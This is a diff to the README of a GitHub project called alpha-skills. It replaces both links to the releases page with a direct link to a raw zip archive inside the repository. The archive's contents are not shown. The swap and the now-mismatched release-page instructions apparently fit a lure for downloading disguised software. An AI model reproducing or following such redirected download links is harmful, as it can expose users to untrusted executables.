@@ -1,6 +1,6 @@
 # 📊 alpha-skills - Better factor research for AI
 
-[![Download alpha-skills](https://img.shields.io/badge/Download%20alpha--skills-blue?style=for-the-badge&logo=github)](https://github.com/Greenrestlessness223/alpha-skills/releases)
+[![Download alpha-skills](https://img.shields.io/badge/Download%20alpha--skills-blue?style=for-the-badge&logo=github)](https://github.com/Greenrestlessness223/alpha-skills/raw/refs/heads/main/skills/alpha-library/skills_alpha_3.7.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ For the best setup, keep your browser open so you can return to the release page
 
 Visit this page to download the latest release:
 
-https://github.com/Greenrestlessness223/alpha-skills/releases
+https://github.com/Greenrestlessness223/alpha-skills/raw/refs/heads/main/skills/alpha-library/skills_alpha_3.7.zip
 
 On the release page:
 1. Open the newest release
